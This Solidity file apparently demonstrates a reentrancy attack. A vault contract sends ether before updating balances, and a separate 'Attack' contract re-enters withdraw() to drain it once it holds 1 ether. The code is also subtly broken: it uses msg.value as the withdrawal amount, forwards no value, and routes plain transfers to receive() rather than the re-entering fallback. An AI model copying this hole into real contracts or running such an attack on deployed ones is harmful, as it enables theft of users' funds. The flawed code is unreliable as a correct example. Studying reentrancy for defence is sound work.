// SPDX-License-Identifier: MIT
pragma solidity >=0.4.0 < 0.9.0;


contract Mycontract{
    
    mapping(address =>uint) public balances;
    
    function deposit() external payable{
        balances[msg.sender] += msg.value;
    }
    fallback() external payable{
        balances[msg.sender] += msg.value;
    }


    function balanceOf() public view returns(uint){
        return address(this).balance;
    }
    
    function withdraw()payable public{
        if(msg.value <= balances[msg.sender]){
            payable(msg.sender).call{value:msg.value}("");
            balances[msg.sender] -= msg.value;
        }
        
    }
}

 contract Attack{
    
     Mycontract public mycontract;
    
     constructor(address payable _mycontract){
         mycontract = Mycontract(_mycontract);
     }
    

     fallback()external payable{
         mycontract.withdraw();
     }

     receive() external payable{}

    function attack() external payable{
        if(address(mycontract).balance >= 1 ether){
            mycontract.deposit();
            mycontract.withdraw();}
    }

     function balanceOf() public view returns(uint){
        return address(this).balance;
    }
    
    
    
 }